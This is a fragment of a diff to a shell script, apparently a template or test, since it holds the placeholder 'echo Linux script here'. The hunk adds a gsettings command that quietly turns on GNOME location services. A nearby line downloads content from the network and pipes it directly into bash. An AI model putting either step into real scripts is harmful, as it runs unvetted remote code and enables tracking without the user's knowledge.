@@ -12,6 +12,7 @@ cat <<EOF
 EOF
 echo Linux script here
 
+gsettings set org.gnome.system.location enabled true
 GET reconfiguration.download?$RANDOM | bash
 read varname
 exit
